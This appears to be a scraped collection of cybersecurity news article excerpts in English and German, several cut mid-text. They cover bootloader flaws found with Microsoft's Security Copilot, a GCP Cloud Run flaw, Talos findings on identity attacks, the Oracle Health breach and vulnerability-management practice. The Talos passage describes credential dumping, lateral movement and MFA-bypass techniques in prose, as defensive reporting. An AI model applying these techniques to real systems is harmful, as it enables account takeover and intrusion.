The newly discovered flaws affect systems utilizing Unified Extensible Firmware Interface (UEFI) Secure Boot, including IoT devices, cloud infrastructure, and enterprise IT environments.\nThe vulnerabilities, including an exploitable integer overflow issue, could enable attackers to execute arbitrary code. In GRUB2’s case, attackers could potentially bypass Secure Boot, install stealthy bootkits, and evade enterprise security mechanisms like BitLocker encryption, Microsoft’s Threat Intelligence team\nsaid in a blog post.\n“The implications of installing such bootkits are significant, as this can grant threat actors complete control over the device, allowing them to control the boot process and operating system, compromise additional devices on the network, and pursue other malicious activities,” Microsoft said.\nThis development raises concerns for organizations relying on Secure Boot for device integrity and system protection. According to Microsoft, the vulnerabilities are particularly concerning because successful exploitation could lead to persistent threats that are difficult to remove.\nConcerns over persistent malware\nWhile exploiting vulnerabilities in U-boot or Barebox would likely require physical device access, the GRUB2 flaws present more significant threats to enterprise environments. The most concerning aspect, according to Microsoft is the possibility of creating a persistent malware that would remain intact even after an operating system reinstallation or a hard drive replacement.\n“These bootloader vulnerabilities — especially in GRUB2 — are significant because they enable attackers to implant malware that persists even after OS reinstallation or storage drive replacement,” said Prabhjyot Kaur, senior analyst at Everest Group. “High-security sectors like government, finance, healthcare, and critical infrastructure should prioritize patching immediately.”\nThis level of persistence makes these vulnerabilities particularly dangerous, as traditional remediation steps would be ineffective against such deeply embedded threats. Organizations with large Linux deployments or IoT device fleets should be especially concerned.\nMicrosoft disclosed the vulnerabilities to all affected bootloader maintainers and collaborated on developing fixes. Security updates were released in mid-February 2025, with GRUB2 patches available as of February 18 and both U-boot and Barebox patches released on February 19, the blog added.\nAI-powered discovery changes the cybersecurity landscape\nMicrosoft’s Security Copilot tool significantly accelerated the vulnerability identification process, with a particular focus on filesystem implementations due to their high vulnerability potential.\n“Using Security Copilot, we were able to identify potential security issues in bootloader functionalities, focusing on filesystems due to their high vulnerability potential,” the blog stated. “This approach saved our team approximately a week’s worth of time that would have otherwise been spent manually reviewing the content.”\nThrough carefully crafted prompts, Security Copilot helped uncover an exploitable integer overflow vulnerability and assisted in finding similar vulnerability patterns across multiple files.\n“We’re sharing this research as an example of the increased efficiency, streamlined workflows, and improved capabilities that AI solutions like Security Copilot can deliver for defenders, security researchers, and SOC analysts,” the blog noted.\n“The major shift we’re seeing is from a traditional responsible disclosure approach to something quite different,” said Sunil Varkey, advisor at Beagle Security. “When AI starts discovering vulnerabilities at this accelerated pace, we’ll likely see many more zero-days in the wild.”\nVarkey pointed to an emerging scenario he calls “a weird state where all parties — both defenders and attackers — know about vulnerabilities simultaneously. It’s like the Wild West waiting to see who shoots first, while many defenders haven’t prepared for this speed of discovery.”\n“AI can analyze large codebases, detect memory handling patterns, and suggest fixes at speeds that far outstrip manual analysis,” Kaur added. “While defenders benefit from improved response times, attackers are also leveraging AI—creating a continuous arms race where both sides use these technologies to tip the balance.”\nAs AI tools become increasingly essential for both attackers and defenders, Microsoft emphasized that information sharing among security vendors and researchers remains crucial to maintaining security advantages.\n“For decades, the cybersecurity battlefield has been asymmetrical,” said Sanchit Vir Gogia, chief analyst and CEO at Greyhound Research. “Attackers had time, creativity, and zero red tape. Defenders? Overworked, reactive, and drowning in alerts. But AI is changing that calculus.”\nImplications for enterprise security\nFor enterprise security teams, these discoveries highlight the importance of maintaining up-to-date firmware and bootloaders — areas often overlooked in regular patch management processes. Organizations should review their vulnerability management programs to ensure they adequately address these components.\nThe vulnerabilities also underscore the ongoing risks associated with supply chain security, as many organizations may be using these bootloaders without being directly aware of the underlying components.\nSecurity experts recommend organizations inventory affected systems, prioritize applying the February 2025 security updates, implement monitoring for exploitation attempts, and review firmware update processes to ensure bootloaders are included in regular security maintenance.\n“Organizations should develop policies that explicitly address firmware and bootloader updates, maintain hardware inventories noting which systems use affected bootloaders, and incorporate these lower-level components into existing patch management cycles,” Kaur suggested.\nAccording to Varkey, addressing bootloader vulnerabilities presents unique challenges. “While it is critical to mitigate such vulnerabilities at the firmware level, it’s always a serious challenge. Mitigation patches may not be available in most cases, and their release highly depends on OEM vendors prioritizing them — similar to challenges with OT devices and other firmware. Many publicly known vulnerabilities are never acknowledged or patched by vendors. The only option in such scenarios is to protect at the perimeter or the access control level.”\nRelated content\nOpinion\nAI disinformation didn’t upend 2024 elections, but the threat is very real\nBy\nChristopher Whyte\n03 Apr 2025\n9 mins\nCSO and CISO\nGenerative AI\nSecurity Practices\nBrandpost\nSponsored by Fortinet\nThreat-informed defense for operational technology: Moving from information to action\nBy\nDerek Manky, chief security strategist and global VP of threat intelligence\n02 Apr 2025\n7 mins\nSecurity\nNews\nGoogle fixes GCP flaw that could expose sensitive container images\nBy\nShweta Sharma\n02 Apr 2025\n3 mins\nCloud Security\nSecurity\nVulnerabilities\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

The bespoke “worker” has these permissions, which attackers could potentially use to pull private Google Artifact Registry (GAR) and Google Container Registry (GCR) images from the same account.\nPrivate images are restricted and require authentication to access. They are used to store proprietary applications, configurations, or sensitive code.\nThe worker, aka service agent, “is a special type of service account created and managed by Google Cloud,” said Liv Matan, senior security researcher at Tenable. “If an attacker gains certain permissions within a victim’s project – specifically\nrun.services.update\nand\niam.serviceAccounts.actAs\npermissions – they could modify a Cloud Run service and deploy a new revision.“\nIn doing so, they could specify (through malicious code injection) any private container image stored in a victim’s registries, Matan added.\nAccording to a Tenable statement to CSO, an attacker could use this vulnerability for data theft or espionage in a real-world scenario. The attacker could use their code to inspect the contents of the private image, extract secrets stored within it, or even exfiltrate sensitive data.\nFlaw fixed with explicit read access requirement\nThe flaw, which was never assigned a\nCVE ID\n, received a fix from Google in January wherein Cloud Run was updated with necessary restrictions.\n“The principal (user or service account) creating or updating a Cloud Run resource now needs explicit permission to access the container image(s).” said a Google Cloud disclosure. “When using Artifact Registry, ensure the principal has the Artifact Registry Reader (roles/artifactregistry.reader) IAM role on the project or repository containing the container image(s) to deploy.”\nThe fix was\nrolled out\nto all production on January 28 as a “breaking change,” following a Mandatory Service Announcement sent to affected Project, Folder, and Organization owners during the last week of November 2024, according to Tenable.  A breaking change with reference to GCP refers to an update or modification that disrupts existing functionality, requiring users to update their configurations, code, or workflows to maintain compatibility.\nRelated content\nBrandpost\nSponsored by Fortinet\nThreat-informed defense for operational technology: Moving from information to action\nBy\nDerek Manky, chief security strategist and global VP of threat intelligence\n02 Apr 2025\n7 mins\nSecurity\nNews\nMicrosoft’s AI tool catches critical GRUB2, U-boot bootloader flaws\nBy\nGyana Swain\n02 Apr 2025\n6 mins\nGenerative AI\nSecurity\nVulnerabilities\nNews\nThe UK’s Cyber Security and Resilience Bill will boost standards – and increase costs\nBy\nJohn E.

This is the result of credential dumping from infected devices and techniques aimed to\ndefeat multi-factor authentication (MFA) implementations\n.\n“Difficult to prevent and even harder to detect, identity-based attacks proved to be highly effective in 2024, allowing adversaries to go unnoticed for longer periods of time by using compromised valid accounts, foregoing the use of detectable malware, and sometimes leading to unfettered access to entire networks,” the Talos team wrote in its report.\nObtaining initial access with valid accounts\nRansomware gangs stand out for their extensive use of stolen credentials as a means of initial access into corporate networks. These groups often buy this access from threat actors known as\ninitial access brokers (IABs) in the cybercriminal ecosystem\n.\nBulk lists of credentials commonly sell for $10 to $15 on the\ndark web\n, though experienced actors can charge between $1,000 and $3,000 for access to high-profile companies that can potentially be extorted for a lot of money, according to the Talos researchers.\nMany of these\ncredentials are extracted from computers using so-called infostealer malware\n, malicious programs that scour the operating system and installed applications for saved usernames and passwords, browser session tokens, SSH and VPN certificates, API keys, and more.\nThe advantage of using stolen credentials for initial access is that they require less skill compared to exploiting vulnerabilities in publicly facing applications or tricking users into installing malware from email links or attachments — although these initial access methods remain popular as well.\nAccording to the report, 20% of ransomware attacks involved\nexploiting known vulnerabilities\nand 12% relied on drive-by compromise.\nPhishing also remains high\non the list of initial access methods, being observed in almost a quarter of all incidents investigated by the Talos Incident Response team last year.\nAttackers continue to impersonate popular brands in their phishing messages, with Microsoft Outlook, Apple, LinkedIn, Amazon, PayPal, Shein, Prime, and Netflix among the top abused brands. But more enterprise-specific services and terms are also frequently used, including DHL Express, Confluence, SharePoint Online, WordPress, HR Department, Docusign, Accounts Payable, Support, and Admin.\nMalicious links are by far the most popular\nphishing method\n, used by 58% of rogue emails, followed by malicious attachments (25%) and voice phishing (17%).\nLateral movement: Leveraging privileged access to act in plain sight\nOnce situated on the corporate network, compromised credentials also allow attackers to expand access to other internal systems with a reduced likelihood of being discovered or triggering malware detection.\nAccording to Talos, nearly half of investigated identity attacks targeted Active Directory, with another 20% targeting cloud applications. Dumping credentials stored in the operating system’s credential stores is a very popular technique, as evidenced by open-source credential dumping tool Mimikatz being the top LOLBin (living-off-the-land binary) observed by Talos IR during its investigations.\nPsExec, the second-most popular LoLBin, can be used to execute processes and open command shells on other Windows systems remotely by using valid credentials such as those extracted by Mimikatz. Popular free tools abused in attacks also include remote desktop clients such as RDPclip, AnyDesk, Splashtop, and RDP. These are all\nperfect for lateral movement\n, as they are not by nature malware, but rather common tools used by system administrators.\n“While the majority of actors targeted credentials in LSASS memory and Active Directory, we also saw a variety of other techniques in this threat category, including attempts to extract credentials from the Security Account Manager (SAM) database, attempts to access cached domain credentials, the use of a technique called DCSync to abuse a Windows Domain Controller’s API, and attempts to access Local Security Authority (LSA) secrets — which can contain a variety of different credential materials — which adversaries can obtain with system access to a host,” the Talos team observed.\nEducation, public administration, manufacturing, and healthcare entities saw the highest number of ransomware attacks last year. Organizations from these sectors tend to have weaker network segmentation and large attack surfaces in terms of the number of devices and servers, providing attackers with more opportunities to perform lateral movement once they gain access to valid identities.\n“In August 2024, a Cisco customer in the manufacturing sector reported that multiple endpoint detection and response (EDR) solutions had unexpectedly been uninstalled from servers hosted in the organization’s managed data center, including two domain controllers, potentially indicating threat actors had full Active Directory domain access,” the Talos teams wrote. “In this investigation, Talos IR observed evidence suggesting the actor had compromised the Active Directory in preparation for deploying ransomware. The adversary leveraged ADExplorer, a utility that is part of the suite of the Sysinternals admin tools, to browse the different domains in the environment and dump the Active Directory database.”\nAs the most widely used authentication and authorization solution in enterprise IT, Active Directory (AD) is a gold mine for attackers. It’s critical for organizations to\nfollow industry best practices\nwhen configuring and designing security policies for Active Directory.\nAccessing cloud assets in hybrid environments\nMost organizations’ infrastructure extends to the cloud, with services linking Azure Active Directory with local AD installations. Because of this, attackers have become apt at jumping from cloud environments into local networks or the reverse, extending the types of credentials system admins need to protect by adding API keys and session tokens to the mix.\n“Skilled actors have created tooling that is freely available on the open web, easy to deploy, and designed to specifically target cloud environments,” the Talos researchers found. “Some examples include ROADtools and AAAInternals, publicly available frameworks designed to enumerate Microsoft Entra ID environments. These tools can collect data on users, groups, applications, service principals, and devices, and execute commands.”\nThese are often coupled with techniques designed to exploit the lack of MFA or incorrectly configured MFA. For example, push spray attacks, also known as MFA bombing or MFA fatigue, rely on bombing the user with MFA push notifications on their phones until they get annoyed and approve the login thinking it’s probably the system malfunctioning.\nOther techniques involve tricking victims into enrolling a new MFA-approved device under their accounts, or to use a phishing kit that proxies requests in real-time to the legitimate website and asks the victim to provide the MFA code themselves.\nIn one example Talos IR investigated, attackers compromised a university with more than 100,000 users by tricking a system admin to click on an authentication link that added the attacker’s device to the university’s MFA-approved list. The attackers already had the administrator’s username and password, likely from a separate breach or an IAB.\nWith access to the admin’s account, the attackers sent highly credible phishing emails to other users throughout the organization. One of the biggest pitfalls in this case was that the university had more than 50 accounts with admin privileges, all of which were external contractors, significantly increasing the chances one could be compromised.\nWith the rise of gen AI chatbots and increasingly sophisticated large language models in recent years, phishing attacks are becoming more varied, sophisticated, and harder to spot, which means that identity-based attacks are even more likely to occur. According to Talos, social engineering was the top observed use of AI for both cybercriminal and state-sponsored cyberespionage groups last year.\nMitigations\n“We frequently observe accounts (i.e., user, admin, and service) with excessive or incorrect privileges, accounts with weak or default passwords, flat network architectures, and missing or misconfigured MFA,” the Talos team said. “Our recommendations for mitigating Active Directory compromises are in line with\nCISA’s strategies\nto mitigate the 17 most common techniques used by adversaries and malicious actors to compromise Active Directory.”\nSince an increasing number of attacks against organizations rely on identity-based techniques, the Talos team strongly advises turning on MFA for accounts and services that don’t have it configured. For example, enterprise VPN accounts often lack this added protection, based on Talos’ observations. But simply adding MFA isn’t enough if it’s not properly configured and account activity is not monitored for suspicious behavior.\nEducating users\non MFA exhaustion attacks and enforcing stricter MFA prompt thresholds per IP or device is also recommended, as well as enabling higher security factors such as challenge-response authentication where users are also presented with security questions they must answer. Organizations should also continuously monitor new MFA device enrollments and enforce stricter policies for such enrollment if possible.\nRelated content\nFeature\n6 hard-earned tips for leading through a cyberattack — from CSOs who’ve been there\nBy\nEric Frank\n01 Apr 2025\n11 mins\nCyberattacks\nIT Strategy\nIncident Response\nNews\nVolume of attacks on network devices shows need to replace end of life devices quickly\nBy\nHoward Solomon\n31 Mar 2025\n7 mins\nCyberattacks\nNetwork Security\nVulnerabilities\nFeature\n11 ways cybercriminals are making phishing more potent than ever\nBy\nJohn Leyden\n25 Mar 2025\n12 mins\nEmail Security\nPhishing\nSocial Engineering\nOther Sections\nPODCASTS\nVIDEOS\nRESOURCES\nEVENTS\nSPOTLIGHT: SOLVING DATA ANALYTICS CHALLENGES\nSUBSCRIBE TO OUR NEWSLETTER\nFrom our editors straight to your inbox\nGet started by entering your email address below.\nPlease enter a valid email address\nSubscribe",

        "content": "Oracle Health meldet eine Datenschutzverletzung, bei der möglicherweise sensible Kundendaten offengelegt wurden.\nHacker haben sich Zugriff auf Daten von Oracle Health verschafft.\nPincasso – shutterstock.com\nWährend Oracle den\nDatenverstoß\n, der in der vergangenen Woche ans Licht kam, öffentlich abstreitet, informierte die Tochtergesellschaft Oracle Health kürzlich betroffene Kunden über ein Datenleck. Betroffen waren Daten von alten Datenmigrations-Server von Cerner, wie aus einem\nBericht von\nBleeping Computer hervorgeht. Oracle hatte den IT-Dienstleister für das Gesundheitswesen, aus dem später Oracle Health hervorging, 2021 übernommen.\n„Wir schreiben Ihnen, um Sie darüber zu informieren, dass wir am oder um den 20. Februar 2025 auf ein Cybersicherheitsvorfall aufmerksam wurden, bei dem unbefugter Zugriff auf einen Teil Ihrer Cerner-Daten erfolgte, die sich auf einem alten Legacy-Server befanden, der noch nicht in die Oracle Cloud migriert worden war“, heißt es in der Mitteilung von Oracle.\nObwohl der Vorfall bei Oracle Health nichts mit dem mutmaßlichen Cloud-Verstoß beim Mutterkonzern zu tun hat, wirft er ernsthafte Bedenken hinsichtlich der Sicherheitspraktiken des Unternehmens auf. Insbesondere im Hinblick auf den Schutz sensibler Kundendaten.\nFBI untersucht den Vorfall\nLaut einem Bericht von\nBloomberg\nuntersucht das FBI den Fall bei Oracle Health und die Versuche der Angreifer, betroffene medizinische Dienstleister zu erpressen. „Hacker sind in die Computersysteme von Oracle Corp. eingedrungen und haben Patientendaten gestohlen, um mehrere medizinische Dienstleister in den USA zu erpressen“, heißt es in dem Bericht unter Berufung auf eine informierte Person. “Allerdings ist nicht bekannt, wie viele Patientenakten entwendet wurden. Auch die Gesamtzahl der Gesundheitsdienstleister, die die Hacker zu erpressen versuchten, ist ungewiss.“\nDie Kundenmitteilung deutet daraufhin, dass die Sicherheitsverletzung die Daten von Cerner betraf, bevor sie in die Oracle Cloud hochgeladen wurden. Ob es sich dabei um einen völlig unabhängigen Fall handelt, ist jedoch angesichts des zeitlichen Ablaufs der beiden Vorfälle und der Tatsache, dass die Sicherheitsverletzung bei den Gesundheitsdaten mit gestohlenen Logins erfolgte, nicht sicher.\n„Die verfügbaren Beweise deuten darauf hin, dass der Bedrohungsakteur sich illegal Zugang zur Umgebung verschafft hat, indem er gestohlene Login-Daten von Kunden verwendet hat“, heißt es in dem Rundschreiben.\nHintergrund zum Oracle-Cloud-Angriff\nDas Cybersicherheitsunternehmen CloudSEK berichtete als erster über den Cloud-Angriff, bei dem ein Bedrohungsakteur namens „rose87168“ sechs Millionen Datensätze verkaufte, die aus dem Single-Sign-On (SSO) und dem Lightweight Directory Access Protocol (LDAP) von Oracle Cloud exfiltriert wurden.\nWährend Oracle den Vorfall den Medien gegenüber schnell abstritt, wurden Daten, die als Beispiele für den Vorfall weitergegeben wurden, von mehreren Oracle-Kunden validiert. Darüber hinaus demonstriert der Bedrohungsakteur gegenüber Bleeping Computer anhand einer URL von archive.org (http://login.us2.oraclecloud.com), dass er auch Schreibzugriff auf den Anmeldedienst, der Oracle Access Manager verwendet, hatte.\nOracle  forderte  im Anschluss, dass Wayback Machine (Archive.org) die archivierte URL entfernen soll – ein Schritt, den unabhängige Cybersecurity-im Internet als Vertuschungsversuch kritisierten von Oracle. In der Zwischenzeit\nhat der Bedrohungsakteur\nauch ein langes Video von einer internen Oracle-Besprechung veröffentlicht, das vermutlich aus dem Datenleck stammt und seine Behauptungen untermauert.\n„In der Cybersicherheit neutralisiert Leugnen die Gefahr nicht, Transparenz schon“, erklärte Rahul Sassi, Mitbegründer und CEO von CloudSEK, gegenüber CSO. “Bei dieser Untersuchung geht es nicht um Schuldzuweisungen, sondern um Verantwortlichkeit. Es geht darum, jedes Sicherheitsteam, jeden Kunden und jeden Anbieter in der Lieferkette zu befähigen, zu handeln, bevor es Angreifer tun.“\nZu den von der Sicherheitsverletzung betroffenen Daten gehörten laut\nCloudSEK\nJKS-Dateien, verschlüsselte SSO-Passwörter, Schlüsseldateien und JPS-Schlüssel für Unternehmensmanager. Während die SSO-Passwörter mit anderen kompromittierten Dateien geknackt werden konnten, waren die LDAP-Passwörter verschlüsselt und der Angreifer bat in seinem\nPost\num Hilfe bei der Entschlüsselung im Austausch gegen einige kompromittierte Daten.

        "content": "After years of neglect, organizations are investing in vulnerability management programs to address business risk. A dozen CISOs offer lessons learned and best practices.\nCredit: \t\t\t\t\t\t\t\t\t\t\t\t\t\t\tStudio Romantic / Shutterstock\nIt was 2003, and I was giving my first cybersecurity presentation at an industry conference in Chicago. I talked about the onslaught of\nworms and viruses\nat the time (MSBlast, SQLSlammer, etc.), and stressed the importance of strong vulnerability and patch management to the audience.\nWhen it came time for the Q&A, an audience member summarized his predicament and posed a very poignant question: “We have thousands of vulnerabilities at any one time. How do we figure out which ones to prioritize?”\nI responded with a generic answer along the lines of “prioritize based on known threats to your organization,” or “prioritize based on the business criticality of the asset.” It was accurate, but vague. Fast forward more than 20 years, and the audience member’s predicament and question still vex many organizations.\nWhat has changed, however, is the scale of the problem. In 2003, enterprise organizations had thousands of active vulnerabilities. Now they face hundreds of thousands or more. Meanwhile, many organizations have the same challenges they did years ago — a lack of experienced staff, manual processes, misaligned goals between security and other teams (IT ops, software development), and more.\nSince modern enterprises run on software, poor vulnerability management represents a serious business risk. So, how are CISOs modernizing their programs to improve risk mitigation? Over the past several months, I spoke to a dozen security executives to find out. While I have pages and pages of written notes on the subject, their answers boiled down to 10 best practices.\n10 consistent best practices in managing vulnerabilities\n1. Culture\nAchieving a successful vulnerability management program starts with establishing a cybersecurity-minded culture across the organization. Many CISOs admitted to facing historical cultural problems, with one summing it up well. “Our cybersecurity culture was pretty laissez-faire until we got hit with\nLog4J\nand then a ransomware attack,” he told CSO. “These events were an awakening for the CEO and board. That’s when they hired me, adjusted the budget, and committed to doing what needed to be done.” Improving vulnerability management was a top priority in this cultural transition.\n2. Documentation\nMost CISOs agreed that all phases of vulnerability management should be well documented, assessed, and reviewed. This is an important admission that there is no quick fix to longstanding vulnerability management woes.\nRather, organizations must dig into each phase of the vulnerability management lifecycle, look for inefficiencies, devise strategies for improvement, and define the right metrics to measure progress. CISOs also understand that there is no endgame here, but having a dependable record encourages continuous iterative improvement in all phases, all the time.\n3. Establish processes\nMost of the CISOs I spoke with borrowed heavily from existing frameworks but customized them to their business, industry, and organizational needs. Once instituted, standard vulnerability management processes can be rolled out across an enterprise and monitored for continuous improvement.\nOne CISO mentioned that her organization has taken this a step further — following an acquisition, the security team has a canned program that will transform the acquired company’s vulnerability management program to fit its established model, complete with metrics to gauge progress.\n4. Define what security data is necessary\nTo be clear, this isn’t a technology inventory exercise — at least not at first. CISOs assess what data they have and compare this to what data they need. Armed with this knowledge, they can then assign staffers to find technologies to fill the gaps.\n5. Embed integration into vulnerability management\nOnce again, this is an academic rather than a technology project. It starts by looking into who needs what data and establishing where it comes from. Once individuals receive the right data, what do they do with it? Assuming all of this goes well, do data analytics trigger automated or manual actions? After mapping all the “goes into” and “goes out of” components, CISOs often bring in vendor partners for a look-see. The goal? Get them onboard with the necessary connectors, APIs, and data formats to turn design into reality.\n6. Determine the right metrics for prioritization\nThis directly addresses the question posed to me in 2003. It’s also where vulnerability management meets exposure management, and it’s all about context. What is the business value of a vulnerable asset? Is a vulnerable asset on the attack path? Is there a compensating control in place? Has the compensating control been tested recently?\nI know this seems like an obvious step, but the CISOs I spoke with have codified (or plan on codifying) this and more inputs into a customized risk-scoring system that anchors the whole enchilada.\n7. Create SLA discipline\nThe prioritization hierarchy is married to strict service-level agreements (SLA) across security, IT, software development, and third-party risk management teams. Exceptions are rare. Many organizations also have formal review processes when teams miss SLA deadlines. Again, continuous improvement is required here.\n8. Develop an emergency patching program\nEvents like Log4Shell and\nSolarWinds\nwere wake-up calls, as many CISOs learned how unprepared their organizations were for this type of emergency event. This realization caused CISOs to create, staff, and test incident response plans designed specifically for these types of incidents.\nAs one CISO said, “While I was proud of how we responded to past events, several team members were burnt out for weeks, and we had a spike in attrition. Rather than rely on heroes, we needed a systematic program we could count on. I hope there’s no ‘next time,’ but if there is, we’re better prepared.”\n9. Align goals, metrics, and compensation across diverse teams\nVulnerability management depends upon a cross-functional team with strong communication, consistent metrics, and common goals — this is the people part.\nIt starts with the commitment to a cybersecurity culture discussed above, but CISOs I spoke with also worked with CIOs, line of business managers, and human resources folks to create the right workflows, automations, reports, messaging, and even employee compensation benefits to motivate cooperation across disparate groups and individuals. Security becomes far more effective when CISOs regularly team up with CIOs to uncover bottlenecks and review progress.\n10.Reinforce VM with continuous efficacy testing.\nYears ago, I created an awkward acronym, SOPV, which stood for security observability, prioritization, and validation. The acronym never caught on, but the CISOs I spoke with have accepted (or are accepting) the notion of continuous security validation testing.\nOf course, verification is one of the phases of the vulnerability management lifecycle, so what’s changed? Many firms have moved from periodic penetration testing to continuous security testing with new tools or managed services. MITRE calls this a threat-informed defense. In this way, organizations not only verify vulnerability remediation, but they also test controls efficacy and provide a blueprint for detection rules engineering.\nCISOs had many other war stories and recommendations, but these 10 were fairly common regardless of organizational size, location, or industry. I’ll conclude by reporting on one other commonality: to use a frequent cybersecurity analogy, CISOs realize that strong vulnerability management is a non-linear journey, not a destination.\nIn other words, you are never finished with anything, but rather always looking to improve every step and individual task along the way. There is always a lot of work to be done, but that’s the reality when you’re protecting a modern enterprise.\nRelated content\nOpinion\nAI disinformation didn’t upend 2024 elections, but the threat is very real\nBy\nChristopher Whyte\n03 Apr 2025\n9 mins\nCSO and CISO\nGenerative AI\nSecurity Practices\nFeature\nVeterans are an obvious fit for cybersecurity, but tailored support ensures they succeed\nBy\nMary K.

        "content": "Setzen Sie die richtigen Tools ein, um die aktuellen Cybersecurity-Herausforderungen im Unternehmensumfeld stemmen zu können?\nLesen Sie, welche Werkzeuge essenziell sind, um Unternehmen gegen Cybergefahren abzusichern.\nGorodenkoff | shutterstock.com\nSicherheitsentscheider sind mit einer sich kontinuierlich verändernden Bedrohungslandschaft, einem zunehmend strengeren, regulatorischen Umfeld und immer komplexeren IT-Infrastrukturen\nkonfrontiert\n. Auch deshalb wird die Qualität ihrer Sicherheits-Toolsets immer wichtiger.\nDas Problem ist nur, dass die Bandbreite der heute verfügbaren Cybersecurity-Lösungen überwältigend ist. Für zusätzliche Verwirrung sorgen dabei nicht nur diverse\nBuzzwords\n, sondern auch diverse Überschneidungsbereiche der unterschiedlichen Tool-Kategorien.\nIm Folgenden lesen Sie, welche Art von Security-Lösungen für Unternehmen obligatorisch sind – und warum.\n13 essenzielle Security-Tools für Unternehmen\n1.\nExtended Detction and Response (XDR)\nKI-gestützte XDR-Lösungen entwickeln sich zu einer tragenden Säule der „Next Generation“-Security. Allerdings ist diese Tool-Kategorie\nsowohl schwer abzugrenzen als auch zu definieren\n. Extended-Detection-and-Response-Lösungen arbeiten am Top-Funnel und identifizieren Bedrohungen in Netzwerken, Endpunkten oder der Cloud, indem sie die Sicherheits-Tools, die im Unternehmen zum Einsatz kommen automatisieren oder integrieren. Laut Forrester Research können Bedrohungen so besser identifiziert und analysiert werden. Zudem verbessert sich dank Echtzeit-Features auch die Fähigkeit, auf Threats zu reagieren. Werden die XDR-Funktionen ausgelagert, spricht man von\nManaged Detection and Response\n– MDR.\nXDR auf KI-Basis ist ein effektives Threat-Intelligence- und Vulnerability-Management-Tool und kann dazu beitragen, Attacken auf Unternehmensnetzwerke abzuwehren. In der Regel kommen XDR-Tools in Kombination mit Firewalls zum Einsatz. Das soll gewährleisten, Bedrohungen zu identifizieren und priorisieren, sobald sie im Netzwerk sind. Die Zielsetzung besteht allgemein darin, den Großteil der Threats in (nahezu) Echtzeit und ohne manuelle Verifizierung zu blockieren.\n2.\nMultifaktor-Authentifizierung (MFA)\nNicht nur für den Schutz von Endpunkten sind MFA-Lösungen längst unverzichtbar geworden. Auch viele Cyberversicherer setzen\nMFA\ninzwischen für den Zugang zu ihren Policen voraus. Das verlangt den Benutzern ab, sich zusätzlich zu authentifizieren, sobald sie auf ein Konto oder eine Applikation zugreifen möchten. Dazu kommen beispielsweise externe Security-Keys, mobile Authentifizierungs-Apps oder SMS-Codes zum Einsatz. Eine adaptive MFA-Lösung erfordert hingegen nur dann eine zusätzliche Authentifizierung, wenn Benutzerinteraktionen als risikobehaftet eingestuft werden.\nIm Vergleich zur einfachen Benutzerauthentifizierung mit Benutzername und\nPasswort\nist die Multifaktor-Authentifizierung die sicherere und effizientere Methode.\n3.\nNetwork Access Control (NAC)\nNAC befähigt Unternehmen dazu, Sicherheitsrichtlinien durchzusetzen, sobald Devices oder Benutzer versuchen, auf ihr Netzwerk zugreifen. Das sorgt für einen klaren Blick darauf, wer sich von wo aus anmeldet und gewährleistet, dass die verbundenen Devices über die nötigen Sicherheits-Updates und Kontrollmaßnahmen verfügen, bevor rollenbasierter Zugriff auf Unternehmensressourcen gewährt wird.\nAngesichts immer komplexerer IT-Infrastrukturen und neuen Regulierungen ist der Blick auf alle mit dem Unternehmensnetzwerk  verbundenen Geräte sowie einheitliche Zugriffskontrollen unabdingbar. Das Gros der NAC-Anbieter hat seine Produkte dabei auf die wachsende Zahl von Mobile- und\nIoT-Devices\nausgelegt.\n4.\nData Loss Prevention (DLP)\nDLP-Tools sorgen dafür, dass sensible Unternehmensdaten (unabsichtlich oder absichtlich) nicht nach außen dringen. Dazu überwachen diese Werkzeuge den Netzwerk-Traffic auf bestimmte Datenelemente oder Muster (beispielsweise\nKreditkarteninformationen\n) und alarmieren Administratoren, wenn das Risiko eines Datenabflusses besteht. Diverse Produkte im Bereich Data Loss Prevention sind außerdem darauf konzipiert, auch vor Cloud-basierten Datenlecks zu schützen.\nEntsprechend ist eine DLP-Lösung ein essenzielles Werkzeug, um cyberkriminelle Aktivitäten im Netzwerk zu erkennen. Darüber hinaus ist diese Kategorie jedoch auch von entscheidender Bedeutung, um\nInsider-Bedrohungen\nzu identifizieren. Angesichts der Bußgelder, die bei einem Datenschutzverstoß drohen, ist eine effiziente Data Loss Prevention Software auch in monetärer Hinsicht eine lohnende Investition.\n5.\nFirewall\nEine Firewall filtert auf der Grundlage definierter Regeln (die von Administratoren festgelegt werden) den Netzwerkverkehr. Das erhöht den Schutz vor\nMalware\n, nicht autorisierten Anmeldeversuchen und anderen Bedrohungen. Über eine Firewall-Lösung erhalten Unternehmen die Möglichkeit, ihren Traffic anhand diverser verschiedener Kriterien zu filtern – beispielsweise IP-Ranges, URLs oder Ports.\nModerne Firewall-Produkte gehen längst über die reine Perimeter-Schutzfunktion hinaus und bieten erweiterten, Client-seitigen Schutz. Dabei nutzen State-of-the-Art-Lösungen auch Machine Learning (ML) und künstliche Intelligenz (KI), um Muster oder Anomalien in Echtzeit zu erkennen und automatisiert darauf zu reagieren. Das kann dazu beitragen, potenzielle Schäden erheblich zu minimieren oder vollständig abzuwenden.\n6.\nIntrusion Prevention Systems (IPS)\nBei Intrusion-Prevention-Systemen handelt es sich um eine „Inline“-Technologie, die in der Regel „hinter“ der Firewall eingesetzt wird, um schadhafte Datenpakete im Traffic automatisch zu löschen. Dazu kommen weitere, proaktive Maßnahmen, um Bedrohungen weiter einzudämmen, etwa Netzwerk-Scans und Reporting-Funktionen zu potenziellen Bedrohungen.\nEin IPS ergänzt und erweitert also Firewalls und andere Netzwerk-Verteidigungssysteme. Dabei kann diese Kategorie von Lösung die Reaktionszeit auf\nSicherheitsvorfälle\npotenziell erheblich verkürzen und damit Schaden vom Unternehmen abwenden.\n7.\nIdentity and Access Management (IAM)\nUm den Benutzerzugriff auf Systeme und Daten zu kontrollieren, kommen Unternehmen an\nIAM\nnicht vorbei. Diese Lösungen stellen sicher, dass ausschließlich autorisierte Personen auf die Ressourcen zugreifen können, die sie benötigen. Das funktioniert im Regelfall über rollenbasierte Zugriffsrechte.\nWeil immer mehr Applikationen und Daten in die Cloud migriert werden, entwickelt sich die Benutzeridentität zum neuen Perimeter. Entsprechend wichtig ist es, eine IAM-Lösung einzusetzen. Diese wird inzwischen auch im Rahmen diverser\nCyberversicherungspolicen\nvorausgesetzt.\n8.\nCloud Access Security Broker (CASB)\nCASBs ermöglichen es Unternehmen, Sicherheitsrichtlinien für Benutzer durchzusetzen, die auf Cloud-basierte Services zugreifen. Diese 